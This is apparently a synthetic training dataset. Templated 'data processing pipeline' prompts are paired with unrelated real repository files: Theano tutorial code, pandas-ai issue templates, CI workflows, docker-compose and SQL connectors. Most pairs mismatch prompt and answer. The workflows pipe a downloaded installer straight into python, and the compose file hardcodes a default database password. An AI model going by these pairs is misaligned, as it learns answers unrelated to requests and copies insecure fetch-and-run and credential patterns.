{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\" This file contains different utility functions that are not connected\nin anyway to the networks presented in the tutorials, but rather help in\nprocessing the outputs into a more understandable way.\n\nFor example ``tile_raster_images`` helps in generating a easy to grasp\nimage from a set of samples or weights.\n\"\"\"\n\n\nimport numpy\nfrom six.moves import xrange\n\n\ndef scale_to_unit_interval(ndar, eps=1e-8):\n    \"\"\" Scales all values in the ndarray ndar to be between 0 and 1 \"\"\"\n    ndar = ndar.copy()\n    ndar -= ndar.min()\n    ndar *= 1.0 / (ndar.max() + eps)\n    return ndar\n\n\ndef tile_raster_images(X, img_shape, tile_shape, tile_spacing=(0, 0),\n                       scale_rows_to_unit_interval=True,\n                       output_pixel_vals=True):\n    \"\"\"\n    Transform an array with one flattened image per row, into an array in\n    which images are reshaped and layed out like tiles on a floor.\n\n    This function is useful for visualizing datasets whose rows are images,\n    and also columns of matrices for transforming those rows\n    (such as the first layer of a neural net).\n\n    :type X: a 2-D ndarray or a tuple of 4 channels, elements of which can\n    be 2-D ndarrays or None;\n    :param X: a 2-D array in which every row is a flattened image.\n\n    :type img_shape: tuple; (height, width)\n    :param img_shape: the original shape of each image\n\n    :type tile_shape: tuple; (rows, cols)\n    :param tile_shape: the number of images to tile (rows, cols)\n\n    :param output_pixel_vals: if output should be pixel values (i.e. int8\n    values) or floats\n\n    :param scale_rows_to_unit_interval: if the values need to be scaled before\n    being plotted to [0,1] or not\n\n\n    :returns: array suitable for viewing as an image.\n    (See:`Image.fromarray`.)\n    :rtype: a 2-d array with same dtype as X.\n\n    \"\"\"\n\n    assert len(img_shape) == 2\n    assert len(tile_shape) == 2\n    assert len(tile_spacing) == 2\n\n    # The expression below can be re-written in a more C style as\n    # follows :\n    #\n    # out_shape    = [0,0]\n    # out_shape[0] = (img_shape[0]+tile_spacing[0])*tile_shape[0] -\n    #                tile_spacing[0]\n    # out_shape[1] = (img_shape[1]+tile_spacing[1])*tile_shape[1] -\n    #                tile_spacing[1]\n    out_shape = [\n        (ishp + tsp) * tshp - tsp\n        for ishp, tshp, tsp in zip(img_shape, tile_shape, tile_spacing)\n    ]\n\n    if isinstance(X, tuple):\n        assert len(X) == 4\n        # Create an output numpy ndarray to store the image\n        if output_pixel_vals:\n            out_array = numpy.zeros((out_shape[0], out_shape[1], 4),\n                                    dtype='uint8')\n        else:\n            out_array = numpy.zeros((out_shape[0], out_shape[1], 4),\n                                    dtype=X.dtype)\n\n        #colors default to 0, alpha defaults to 1 (opaque)\n        if output_pixel_vals:\n            channel_defaults = [0, 0, 0, 255]\n        else:\n            channel_defaults = [0., 0., 0., 1.]\n\n        for i in xrange(4):\n            if X[i] is None:\n                # if channel is None, fill it with zeros of the correct\n                # dtype\n                dt = out_array.dtype\n                if output_pixel_vals:\n                    dt = 'uint8'\n                out_array[:, :, i] = numpy.zeros(\n                    out_shape,\n                    dtype=dt\n                ) + channel_defaults[i]\n            else:\n                # use a recurrent call to compute the channel and store it\n                # in the output\n                out_array[:, :, i] = tile_raster_images(\n                    X[i], img_shape, tile_shape, tile_spacing,\n                    scale_rows_to_unit_interval, output_pixel_vals)\n        return out_array\n\n    else:\n        # if we are dealing with only one channel\n        H, W = img_shape\n        Hs, Ws = tile_spacing\n\n        # generate a matrix to store the output\n        dt = X.dtype\n        if output_pixel_vals:\n            dt = 'uint8'\n        out_array = numpy.zeros(out_shape, dtype=dt)\n\n        for tile_row in xrange(tile_shape[0]):\n            for tile_col in xrange(tile_shape[1]):\n                if tile_row * tile_shape[1] + tile_col < X.shape[0]:\n                    this_x = X[tile_row * tile_shape[1] + tile_col]\n                    if scale_rows_to_unit_interval:\n                        # if we should scale values to be between 0 and 1\n                        # do this by calling the `scale_to_unit_interval`\n                        # function\n                        this_img = scale_to_unit_interval(\n                            this_x.reshape(img_shape))\n                    else:\n                        this_img = this_x.reshape(img_shape)\n                    # add the slice to the corresponding position in the\n                    # output array\n                    c = 1\n                    if output_pixel_vals:\n                        c = 255\n                    out_array[\n                        tile_row * (H + Hs): tile_row * (H + Hs) + H,\n                        tile_col * (W + Ws): tile_col * (W + Ws) + W\n                    ] = this_img * c\n        return out_array\n", "metadata": {"source": "github.com/donnemartin/data-science-ipython-notebooks", "file_path": "deep-learning/theano-tutorial/intro_theano/utils.py", "language": "python", "complexity": "medium", "star_count": 28407, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import cPickle as pkl\nimport time\n\nimport numpy\nimport theano\nfrom theano import config\nimport theano.tensor as T\nfrom theano.tensor.nnet import categorical_crossentropy\n\nfrom fuel.datasets import TextFile\nfrom fuel.streams import DataStream\nfrom fuel.schemes import ConstantScheme\nfrom fuel.transformers import Batch, Padding\n\n\n# These files can be downloaded from\n# http://www-etud.iro.umontreal.ca/~brakelp/train.txt.gz\n# http://www-etud.iro.umontreal.ca/~brakelp/dictionary.pkl\n# don't forget to change the paths and gunzip train.txt.gz\nTRAIN_FILE = '/u/brakelp/temp/traindata.txt'\nVAL_FILE = '/u/brakelp/temp/valdata.txt'\nDICT_FILE = '/u/brakelp/temp/dictionary.pkl'\n\n\ndef sequence_categorical_crossentropy(prediction, targets, mask):\n    prediction_flat = prediction.reshape(((prediction.shape[0] *\n                                           prediction.shape[1]),\n                                          prediction.shape[2]), ndim=2)\n    targets_flat = targets.flatten()\n    mask_flat = mask.flatten()\n    ce = categorical_crossentropy(prediction_flat, targets_flat)\n    return T.sum(ce * mask_flat)\n\n\ndef gauss_weight(ndim_in, ndim_out=None, sd=.005):\n    if ndim_out is None:\n        ndim_out = ndim_in\n    W = numpy.random.randn(ndim_in, ndim_out) * sd\n    return numpy.asarray(W, dtype=config.floatX)\n\n\nclass LogisticRegression(object):\n    \"\"\"Multi-class Logistic Regression Class\n\n    The logistic regression is fully described by a weight matrix :math:`W`\n    and bias vector :math:`b`. Classification is done by projecting data\n    points onto a set of hyperplanes, the distance to which is used to\n    determine a class membership probability.\n    \"\"\"\n\n    def __init__(self, input, n_in, n_out):\n        \"\"\" Initialize the parameters of the logistic regression\n\n        :type input: theano.tensor.TensorType\n        :param input: symbolic variable that describes the input of the\n                      architecture (one minibatch)\n\n        :type n_in: int\n        :param n_in: number of input units, the dimension of the space in\n                     which the datapoints lie\n\n        :type n_out: int\n        :param n_out: number of output units, the dimension of the space in\n                      which the labels lie\n\n        \"\"\"\n\n        # initialize with 0 the weights W as a matrix of shape (n_in, n_out)\n        self.W = theano.shared(value=numpy.zeros((n_in, n_out),\n                                                 dtype=theano.config.floatX),\n                               name='W', borrow=True)\n        # initialize the baises b as a vector of n_out 0s\n        self.b = theano.shared(value=numpy.zeros((n_out,),\n                                                 dtype=theano.config.floatX),\n                               name='b', borrow=True)\n\n        # compute vector of class-membership probabilities in symbolic form\n        energy = T.dot(input, self.W) + self.b\n        energy_exp = T.exp(energy - T.max(energy, 2)[:, :, None])\n        pmf = energy_exp / energy_exp.sum(2)[:, :, None]\n        self.p_y_given_x = pmf\n\n        # compute prediction as class whose probability is maximal in\n        # symbolic form\n        self.y_pred = T.argmax(self.p_y_given_x, axis=1)\n\n        # parameters of the model\n        self.params = [self.W, self.b]\n\n\ndef index_dot(indices, w):\n    return w[indices.flatten()]\n\n\nclass LstmLayer:\n\n    def __init__(self, rng, input, mask, n_in, n_h):\n\n        # Init params\n        self.W_i = theano.shared(gauss_weight(n_in, n_h), 'W_i', borrow=True)\n        self.W_f = theano.shared(gauss_weight(n_in, n_h), 'W_f', borrow=True)\n        self.W_c = theano.shared(gauss_weight(n_in, n_h), 'W_c', borrow=True)\n        self.W_o = theano.shared(gauss_weight(n_in, n_h), 'W_o', borrow=True)\n\n        self.U_i = theano.shared(gauss_weight(n_h), 'U_i', borrow=True)\n        self.U_f = theano.shared(gauss_weight(n_h), 'U_f', borrow=True)\n        self.U_c = theano.shared(gauss_weight(n_h), 'U_c', borrow=True)\n        self.U_o = theano.shared(gauss_weight(n_h), 'U_o', borrow=True)\n\n        self.b_i = theano.shared(numpy.zeros((n_h,), dtype=config.floatX),\n                                 'b_i', borrow=True)\n        self.b_f = theano.shared(numpy.zeros((n_h,), dtype=config.floatX),\n                                 'b_f', borrow=True)\n        self.b_c = theano.shared(numpy.zeros((n_h,), dtype=config.floatX),\n                                 'b_c', borrow=True)\n        self.b_o = theano.shared(numpy.zeros((n_h,), dtype=config.floatX),\n                                 'b_o', borrow=True)\n\n        self.params = [self.W_i, self.W_f, self.W_c, self.W_o,\n                       self.U_i, self.U_f, self.U_c, self.U_o,\n                       self.b_i, self.b_f, self.b_c, self.b_o]\n\n        outputs_info = [T.zeros((input.shape[1], n_h)),\n                        T.zeros((input.shape[1], n_h))]\n\n        rval, updates = theano.scan(self._step,\n                                    sequences=[mask, input],\n                                    outputs_info=outputs_info)\n\n        # self.output is in the format (batchsize, n_h)\n        self.output = rval[0]\n\n    def _step(self, m_, x_, h_, c_):\n\n        i_preact = (index_dot(x_, self.W_i) +\n                    T.dot(h_, self.U_i) + self.b_i)\n        i = T.nnet.sigmoid(i_preact)\n\n        f_preact = (index_dot(x_, self.W_f) +\n                    T.dot(h_, self.U_f) + self.b_f)\n        f = T.nnet.sigmoid(f_preact)\n\n        o_preact = (index_dot(x_, self.W_o) +\n                    T.dot(h_, self.U_o) + self.b_o)\n        o = T.nnet.sigmoid(o_preact)\n\n        c_preact = (index_dot(x_, self.W_c) +\n                    T.dot(h_, self.U_c) + self.b_c)\n        c = T.tanh(c_preact)\n\n        c = f * c_ + i * c\n        c = m_[:, None] * c + (1. - m_)[:, None] * c_\n\n        h = o * T.tanh(c)\n        h = m_[:, None] * h + (1. - m_)[:, None] * h_\n\n        return h, c\n\n\ndef train_model(batch_size=100, n_h=50, n_epochs=40):\n\n    # Load the datasets with Fuel\n    dictionary = pkl.load(open(DICT_FILE, 'r'))\n    dictionary['~'] = len(dictionary)\n    reverse_mapping = dict((j, i) for i, j in dictionary.items())\n\n    print(\"Loading the data\")\n    train = TextFile(files=[TRAIN_FILE],\n                     dictionary=dictionary,\n                     unk_token='~',\n                     level='character',\n                     preprocess=str.lower,\n                     bos_token=None,\n                     eos_token=None)\n\n    train_stream = DataStream.default_stream(train)\n\n    # organize data in batches and pad shorter sequences with zeros\n    train_stream = Batch(train_stream,\n                         iteration_scheme=ConstantScheme(batch_size))\n    train_stream = Padding(train_stream)\n\n    # idem dito for the validation text\n    val = TextFile(files=[VAL_FILE],\n                     dictionary=dictionary,\n                     unk_token='~',\n                     level='character',\n                     preprocess=str.lower,\n                     bos_token=None,\n                     eos_token=None)\n\n    val_stream = DataStream.default_stream(val)\n\n    # organize data in batches and pad shorter sequences with zeros\n    val_stream = Batch(val_stream,\n                         iteration_scheme=ConstantScheme(batch_size))\n    val_stream = Padding(val_stream)\n\n    print('Building model')\n\n    # Set the random number generator' seeds for consistency\n    rng = numpy.random.RandomState(12345)\n\n    x = T.lmatrix('x')\n    mask = T.matrix('mask')\n\n    # Construct the LSTM layer\n    recurrent_layer = LstmLayer(rng=rng, input=x, mask=mask, n_in=111, n_h=n_h)\n\n    logreg_layer = LogisticRegression(input=recurrent_layer.output[:-1],\n                                      n_in=n_h, n_out=111)\n\n    cost = sequence_categorical_crossentropy(logreg_layer.p_y_given_x,\n                                             x[1:],\n                                             mask[1:]) / batch_size\n\n    # create a list of all model parameters to be fit by gradient descent\n    params = logreg_layer.params + recurrent_layer.params\n\n    # create a list of gradients for all model parameters\n    grads = T.grad(cost, params)\n\n    # update_model is a function that updates the model parameters by\n    # SGD Since this model has many parameters, it would be tedious to\n    # manually create an update rule for each model parameter. We thus\n    # create the updates list by automatically looping over all\n    # (params[i], grads[i]) pairs.\n    learning_rate = 0.1\n    updates = [\n        (param_i, param_i - learning_rate * grad_i)\n        for param_i, grad_i in zip(params, grads)\n    ]\n\n    update_model = theano.function([x, mask], cost, updates=updates)\n\n    evaluate_model = theano.function([x, mask], cost)\n\n    # Define and compile a function for generating a sequence step by step.\n    x_t = T.iscalar()\n    h_p = T.vector()\n    c_p = T.vector()\n    h_t, c_t = recurrent_layer._step(T.ones(1), x_t, h_p, c_p)\n    energy = T.dot(h_t, logreg_layer.W) + logreg_layer.b\n\n    energy_exp = T.exp(energy - T.max(energy, 1)[:, None])\n\n    output = energy_exp / energy_exp.sum(1)[:, None]\n    single_step = theano.function([x_t, h_p, c_p], [output, h_t, c_t])\n\n    start_time = time.clock()\n\n    iteration = 0\n\n    for epoch in range(n_epochs):\n        print 'epoch:', epoch\n\n        for x_, mask_ in train_stream.get_epoch_iterator():\n            iteration += 1\n\n            cross_entropy = update_model(x_.T, mask_.T)\n\n\n            # Generate some text after each 20 minibatches\n            if iteration % 40 == 0:\n                try:\n                    prediction = numpy.ones(111, dtype=config.floatX) / 111.0\n                    h_p = numpy.zeros((n_h,), dtype=config.floatX)\n                    c_p = numpy.zeros((n_h,), dtype=config.floatX)\n                    initial = 'the meaning of life is '\n                    sentence = initial\n                    for char in initial:\n                        x_t = dictionary[char]\n                        prediction, h_p, c_p = single_step(x_t, h_p.flatten(),\n                                                           c_p.flatten())\n                    sample = numpy.random.multinomial(1, prediction.flatten())\n                    for i in range(450):\n                        x_t = numpy.argmax(sample)\n                        prediction, h_p, c_p = single_step(x_t, h_p.flatten(),\n                                                           c_p.flatten())\n                        sentence += reverse_mapping[x_t]\n                        sample = numpy.random.multinomial(1, prediction.flatten())\n                    print 'LSTM: \"' + sentence + '\"'\n                except ValueError:\n                    print 'Something went wrong during sentence generation.'\n\n            if iteration % 40 == 0:\n                print 'epoch:', epoch, '  minibatch:', iteration\n                val_scores = []\n                for x_val, mask_val in val_stream.get_epoch_iterator():\n                    val_scores.append(evaluate_model(x_val.T, mask_val.T))\n                print 'Average validation CE per sentence:', numpy.mean(val_scores)\n\n    end_time = time.clock()\n    print('Optimization complete.')\n    print('The code ran for %.2fm' % ((end_time - start_time) / 60.))\n\n\nif __name__ == '__main__':\n    train_model()\n", "metadata": {"source": "github.com/donnemartin/data-science-ipython-notebooks", "file_path": "deep-learning/theano-tutorial/rnn_tutorial/lstm_text.py", "language": "python", "complexity": "complex", "star_count": 28407, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: 🐛 Bug Report\ndescription: Create a report to help us reproduce and fix the bug\n\nbody:\n  - type: markdown\n    attributes:\n      value: >\n        #### Before submitting a bug, please make sure the issue hasn't been already addressed by searching through [the existing and past issues](https://github.com/gventuri/pandas-ai/issues?q=is%3Aissue+sort%3Acreated-desc+).\n  - type: textarea\n    id: system-info\n    attributes:\n      label: System Info\n      description: |\n        Please share your system info with us.\n        OS version:\n        Python version:\n        The current version of `pandasai` being used:\n\n      placeholder: pandasai version, platform, python version, ...\n    validations:\n      required: true\n\n  - type: textarea\n    attributes:\n      label: 🐛 Describe the bug\n      description: |\n        Please provide a clear and concise description of what the bug is.\n\n        If relevant, add a minimal example so that we can reproduce the error by running the code. It is very important for the snippet to be as succinct (minimal) as possible, so please take time to trim down any irrelevant code to help us debug efficiently. We are going to copy-paste your code and we expect to get the same result as you did: avoid any external data, and include the relevant imports, etc. For example:\n\n        ```python\n        # All necessary imports at the beginning\n        import pandas as pd\n        from pandasai import Agent\n\n        # Sample DataFrame\n        df = pd.DataFrame({\n            \"country\": [\"United States\", \"United Kingdom\", \"France\", \"Germany\", \"Italy\", \"Spain\", \"Canada\", \"Australia\", \"Japan\", \"China\"],\n            \"gdp\": [19294482071552, 2891615567872, 2411255037952, 3435817336832, 1745433788416, 1181205135360, 1607402389504, 1490967855104, 4380756541440, 14631844184064],\n            \"happiness_index\": [6.94, 7.16, 6.66, 7.07, 6.38, 6.4, 7.23, 7.22, 5.87, 5.12]\n        })\n\n        # Instantiate a LLM\n        from pandasai.llm import OpenAI\n        llm = OpenAI(api_token=\"YOUR_API_TOKEN\")\n\n        df = Agent([df], config={\"llm\": llm})\n        df.chat('Which are the 5 happiest countries?')\n        ```\n\n        Please also paste or describe the results you observe instead of the expected results. If you observe an error, please paste the error message including the **full** traceback of the exception. It may be relevant to wrap error messages in ```` ```triple quotes blocks``` ````.\n      placeholder: |\n        A clear and concise description of what the bug is.\n\n        ```python\n        Sample code to reproduce the problem\n        ```\n\n        ```\n        The error message you got, with the full traceback.\n        ````\n    validations:\n      required: true\n  - type: markdown\n    attributes:\n      value: >\n        Thanks for contributing 🎉!\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": ".github/ISSUE_TEMPLATE/bug_report.yml", "language": "yaml", "complexity": "simple", "star_count": 21053, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: 🚀 Feature request\ndescription: Submit a proposal/request for a new pandas-ai feature\n\nbody:\n- type: textarea\n  attributes:\n    label: 🚀 The feature\n    description: >\n      A clear and concise description of the feature proposal\n  validations:\n    required: true\n- type: textarea\n  attributes:\n    label: Motivation, pitch\n    description: >\n      Please outline the motivation for the proposal. Is your feature request related to a specific problem? e.g., *\"I'm working on X and would like Y to be possible\"*. If this is related to another GitHub issue, please link here too.\n  validations:\n    required: true\n- type: textarea\n  attributes:\n    label: Alternatives\n    description: >\n      A description of any alternative solutions or features you've considered, if any.\n- type: textarea\n  attributes:\n    label: Additional context\n    description: >\n      Add any other context or screenshots about the feature request.\n- type: markdown\n  attributes:\n    value: >\n      Thanks for contributing 🎉!\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": ".github/ISSUE_TEMPLATE/feature_request.yml", "language": "yaml", "complexity": "simple", "star_count": 21053, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: cd\n\non:\n  release:\n    types:\n      - published\n\npermissions:\n  id-token: write\n  contents: read\n\njobs:\n  publish_to_pypi:\n    name: publish to pypi on new release\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n\n      - name: Set up Python\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n\n      - name: Install Poetry and dependencies\n        run: |\n          curl -sSL https://install.python-poetry.org | python3 -\n          export PATH=\"$HOME/.local/bin:$PATH\"\n          poetry self update\n          pip install requests\n\n      - name: Build and publish main package\n        env:\n          PYPI_TOKEN: ${{ secrets.PYPI_TOKEN }}\n        run: |\n          poetry config pypi-token.pypi $PYPI_TOKEN\n          poetry build\n          VERSION=$(poetry version -s)\n          echo \"Checking if pandasai $VERSION exists on PyPI\"\n          if python -c \"import requests, sys; sys.exit(requests.get(f'https://pypi.org/pypi/pandasai/{VERSION}/json').status_code != 200)\"; then\n            echo \"Version $VERSION already exists on PyPI. Skipping publish.\"\n          else\n            echo \"Publishing pandasai $VERSION to PyPI\"\n            poetry publish\n          fi\n\n      - name: Build and publish extensions\n        env:\n          PYPI_TOKEN: ${{ secrets.PYPI_TOKEN }}\n        run: |\n          cd $GITHUB_WORKSPACE\n          find extensions -name pyproject.toml | while read -r project; do\n            dir=$(dirname \"$project\")\n            echo \"Processing $dir\"\n            cd \"$dir\"\n            poetry build\n            PACKAGE_NAME=$(poetry version | cut -d' ' -f1)\n            VERSION=$(poetry version -s)\n            echo \"Checking if $PACKAGE_NAME $VERSION exists on PyPI\"\n            if python -c \"import requests, sys; package_name='$PACKAGE_NAME'; version='$VERSION'; sys.exit(requests.get(f'https://pypi.org/pypi/{package_name}/{version}/json').status_code != 200)\"; then\n              echo \"Version $VERSION of $PACKAGE_NAME already exists on PyPI. Skipping publish.\"\n            else\n              echo \"Publishing $PACKAGE_NAME $VERSION to PyPI\"\n              poetry publish || echo \"Failed to publish $PACKAGE_NAME $VERSION\"\n            fi\n            cd $GITHUB_WORKSPACE\n          done\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": ".github/workflows/cd.yml", "language": "yaml", "complexity": "simple", "star_count": 21053, "quality_score": 0.8600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: ci-core\n\non:\n  push:\n    branches: [main]\n  pull_request:\n\njobs:\n  core-tests:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, windows-latest, macOS-latest]\n        python-version: [\"3.10\", \"3.11\"]\n\n    steps:\n      - name: Clean up instance space\n        if: matrix.os != 'windows-latest'\n        run: |\n          sudo rm -rf /usr/share/dotnet\n          sudo rm -rf /opt/ghc\n          sudo rm -rf \"/usr/local/share/boost\"\n          sudo rm -rf \"$AGENT_TOOLSDIRECTORY\"\n          df -h\n\n      - uses: actions/checkout@v3\n\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n\n      - name: Install Poetry (Unix)\n        if: matrix.os != 'windows-latest'\n        run: |\n          curl -sSL https://install.python-poetry.org | python3 -\n          echo 'export PATH=\"$HOME/.local/bin:$PATH\"' >> $GITHUB_ENV\n\n      - name: Install Poetry (Windows)\n        if: matrix.os == 'windows-latest'\n        run: |\n          (Invoke-WebRequest -Uri https://install.python-poetry.org -UseBasicParsing).Content | python -\n          echo \"C:\\\\Users\\\\runneradmin\\\\AppData\\\\Roaming\\\\Python\\\\Scripts\" >> $env:GITHUB_PATH\n\n      - name: Verify Poetry Installation\n        run: poetry --version\n\n      - name: Clear Poetry Cache\n        run: poetry cache clear pypi --all\n\n      - name: Install future\n        run: pip wheel --use-pep517 \"future==0.18.3\"\n\n      - name: Install dependencies\n        run: poetry install --all-extras --with dev --verbose\n\n      - name: Lint with ruff\n        run: make format_diff\n\n      - name: Spellcheck\n        run: make spell_check\n\n      - name: Run core tests\n        run: make test_core\n\n      - name: Run code coverage\n        continue-on-error: true\n        run: |\n          poetry run coverage run --source=pandasai -m pytest tests\n          poetry run coverage xml\n\n      - name: Report coverage\n        uses: codecov/codecov-action@v3\n        with:\n          token: ${{ secrets.CODECOV_TOKEN }}\n          files: ./coverage.xml\n          flags: unittests\n          name: codecov-umbrella\n          fail_ci_if_error: false\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": ".github/workflows/ci-core.yml", "language": "yaml", "complexity": "simple", "star_count": 21053, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "repos:\n  - repo: https://github.com/charliermarsh/ruff-pre-commit\n    rev: v0.1.3\n    hooks:\n      - id: ruff\n        name: ruff\n        args: [--fix, --select=I, pandasai, examples, tests]\n      - id: ruff-format\n        name: ruff-format\n  - repo: https://github.com/python-poetry/poetry\n    rev: 2.0.1\n    hooks:\n      - id: poetry-check  # Ensures your `pyproject.toml` is valid\n      - id: poetry-lock   # Ensures the `poetry.lock` file is in sync with `pyproject.toml`\n  - repo: local\n    hooks:\n      - id: install-deps\n        name: install-deps\n        entry: make install_deps install_extension_deps\n        language: system\n        pass_filenames: false\n        always_run: true\n        stages: [commit]\n\n      - id: pytest-check\n        name: pytest-check\n        entry: make test_all\n        language: system\n        pass_filenames: false\n        always_run: true\n        stages: [commit]\n\n  - repo: https://github.com/sourcery-ai/sourcery\n    rev: v1.11.0\n    hooks:\n      - id: sourcery\n        # The best way to use Sourcery in a pre-commit hook:\n        # * review only changed lines:\n        # * omit the summary\n        args: [--diff=git diff HEAD, --no-summary]\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": ".pre-commit-config.yaml", "language": "yaml", "complexity": "simple", "star_count": 21053, "quality_score": 0.8600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "services:\n  postgresql:\n    image: postgres:14.2-alpine\n    environment:\n      POSTGRES_USER: pandasai\n      POSTGRES_PASSWORD: password123\n      POSTGRES_DB: pandasai-db\n    ports:\n      - \"5430:5432\"\n    volumes:\n      - ./pgdata:/var/lib/postgresql/data\n    networks:\n      - pandabi-network\n\n  server:\n    container_name: pandabi-backend\n    build:\n      context: ./server\n      dockerfile: Dockerfile\n    ports:\n      - \"8000:8000\"\n    restart: always\n    env_file:\n      - ./server/.env\n    depends_on:\n      - postgresql\n    networks:\n      - pandabi-network\n    command: \"/bin/bash startup.sh\"\n\n  client:\n    container_name: pandabi-frontend\n    build:\n      context: ./client\n      dockerfile: Dockerfile\n    ports:\n      - \"3000:3000\"\n    restart: always\n    env_file:\n      - ./client/.env\n    environment:\n      - NODE_ENV=development\n    command: npm run start\n    networks:\n      - pandabi-network\n\nnetworks:\n  pandabi-network:\n    driver: bridge\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "docker-compose.yml", "language": "yaml", "complexity": "simple", "star_count": 21053, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import warnings\nfrom typing import Optional\n\nimport pandas as pd\n\nfrom pandasai.data_loader.semantic_layer_schema import SQLConnectionConfig\n\n\ndef load_from_mysql(\n    connection_info: SQLConnectionConfig, query: str, params: Optional[list] = None\n):\n    import pymysql\n\n    conn = pymysql.connect(\n        host=connection_info.host,\n        user=connection_info.user,\n        password=connection_info.password,\n        database=connection_info.database,\n        port=connection_info.port,\n    )\n    # Suppress warnings of SqlAlchemy\n    # TODO - Later can be removed when SqlAlchemy is to used\n    with warnings.catch_warnings():\n        warnings.simplefilter(\"ignore\", category=UserWarning)\n        return pd.read_sql(query, conn, params=params)\n\n\ndef load_from_postgres(\n    connection_info: SQLConnectionConfig, query: str, params: Optional[list] = None\n):\n    import psycopg2\n\n    conn = psycopg2.connect(\n        host=connection_info.host,\n        user=connection_info.user,\n        password=connection_info.password,\n        dbname=connection_info.database,\n        port=connection_info.port,\n    )\n    # Suppress warnings of SqlAlchemy\n    # TODO - Later can be removed when SqlAlchemy is to used\n    with warnings.catch_warnings():\n        warnings.simplefilter(\"ignore\", category=UserWarning)\n        return pd.read_sql(query, conn, params=params)\n\n\ndef load_from_cockroachdb(\n    connection_info: SQLConnectionConfig, query: str, params: Optional[list] = None\n):\n    import psycopg2\n\n    conn = psycopg2.connect(\n        host=connection_info.host,\n        user=connection_info.user,\n        password=connection_info.password,\n        dbname=connection_info.database,\n        port=connection_info.port,\n    )\n    # Suppress warnings of SqlAlchemy\n    # TODO - Later can be removed when SqlAlchemy is to used\n    with warnings.catch_warnings():\n        warnings.simplefilter(\"ignore\", category=UserWarning)\n        return pd.read_sql(query, conn, params=params)\n\n\n__all__ = [\n    \"load_from_mysql\",\n    \"load_from_postgres\",\n    \"load_from_cockroachdb\",\n]\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/connectors/sql/pandasai_sql/__init__.py", "language": "python", "complexity": "simple", "star_count": 21053, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
